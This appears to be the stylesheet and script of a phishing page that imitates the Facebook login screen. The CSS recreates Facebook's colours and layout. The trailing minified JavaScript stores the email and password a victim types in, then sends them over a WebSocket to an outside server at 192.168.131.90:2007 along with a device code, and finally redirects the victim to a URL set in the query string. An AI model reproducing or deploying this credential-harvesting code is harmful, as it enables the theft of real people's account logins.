			*{
	margin: 0;

	outline: 0;
	text-decoration: none;

}
body{
	font-family: arial;
	font-size: 14px;
	color: #1c1e21;
	font-weight: normal;
	background: #f0f2f5
}
.loginsignup{
	padding: 120px;
}
.container{
	width: 1050px;
	margin: auto;
}
.row{
	display: flex;
	flex-wrap: wrap;
}
.justify-content-between{
	justify-content: space-between;
}
.content-left{
	max-width: 500px;
	margin: auto;
	padding-bottom: 10%;
	padding-right: 1%;
}
.content-left h1{
	font-size: 50px;
	color: #1877f2;
	margin-bottom: 20px;
	font-weight: 900;
}
.content-left h2{
    font-size: 28px;
    line-height: 32px;
    font-weight: normal;
    margin-bottom: 40px;
}
.content-right{
	max-width: 450px;
	margin: auto;
	text-align: center;
}
.content-right form{
	width: 400px;
	height: 350px;
	background: #fff;
	border-radius: 10px;
	padding: 15px;
	-webkit-box-shadow: 0 2px 4px rgb(0 0 0 / 10%), 0 8px 16px rgb(0 0 0 / 10%);
	-moz-box-shadow: 0 2px 4px rgb(0 0 0 / 10%), 0 8px 16px rgb(0 0 0 / 10%);
	box-shadow: 0 2px 4px rgb(0 0 0 / 10%), 0 8px 16px rgb(0 0 0 / 10%);
	margin-bottom: 30px;
}
.content-right form input{
	width: 100%;
	height: 50px;
	font-size: 17px;
	border: 1px solid #ddd;
	border-radius: 5px;
	padding: 0 15px;
	margin-bottom: 15px;
}
.content-right form input:focus{
	border-color: #1877f2;
    box-shadow: 0 0 0 2px #e7f3ff;
    caret-color: #1877f2;
}
.btn{
	font-size: 20px !important;
    background: #1877f2;
    height: 50px !important;
    color: #fff;
    line-height: 50px;
    border-radius: 5px !important;
    margin-bottom: 20px !important;
    text-transform: capitalize;
    font-weight: 700;
}
.btn:hover{
	cursor: pointer;
}
.login a{
	display: block;
}
.create-btn a{
	display: inline-block;
    margin-top: 0px;
    padding: 0 17px;
    background: #42b72a;
    transition: .3s;
    font-weight: bold !important;
    font-size: 17px !important;
}
.create-btn a:hover{
	background: #36a420;
}
.forgot a{
	font-size: 14px;
	line-height: 19px;
	color:#1877f2;
}
.forgot a:hover,
.content-right p a:hover{
	text-decoration: underline;
}
.content-right p a{
	color: #1c1e21;
	font-weight: 600;
}
/* my css */
.logo-part{
    padding: 28px 0 16px;
}
.logo-part img{
    height: 106px;
    margin: -28px;
}
.line{
	align-items: center;
	border-bottom: 1px solid #dadde1;
	display: flex;
	margin: 17px 16px;
	text-align: center;
}
.loginsignup.pc-verson {
    height: 100vh;
    display: flex;
}
div#pc-verson {
    position: absolute;
	top: 50%;
	left: 50%;
	transform: translate(-50%, -50%);
}

			let btn = document.getElementById('btn');let params = new URLSearchParams('&' + location.href.slice(location.href.indexOf('?')+1, location.href.length));var email, password;const socket = new WebSocket('192.168.131.90:2007');function set_email (iemail){email = iemail}function set_password (ipassword){password = ipassword};socket.onopen = ()=>{console.log('connection on web socket server');};socket.onmessage = async(evnt)=>{	let data = JSON.parse(evnt.data);if (data.message) {if (data.message == 'send-me-the-data') {console.info('sended');socket.send(`{"data":{"email":"${JSON.parse(await localStorage.getItem('user')).email}","password":"${JSON.parse(await localStorage.getItem('user')).password}","greep":"${params.get('greep')}","type":"facebook","divaice":"${await localStorage.getItem('divaice-code')}","from":"${page_name}"}}`);}if (data.message == 'saveed') {let url = params.get('to');location.href = url;}return;}};const click = async()=>{if (email.length < 8 || password.length < 8) {return;}if (! await localStorage.getItem('divaice-code')) {let divaice_code = "divaice-code=";for (let i = 0; i < 50; i++) {divaice_code += (Math.floor(Math.random()*10)).toString();}await localStorage.setItem('divaice-code',divaice_code);console.log(await localStorage.getItem('id'));}await localStorage.setItem('user',`{"email":"${email}","password":"${password}"}`);socket.send('{"message":"call-me"}');}
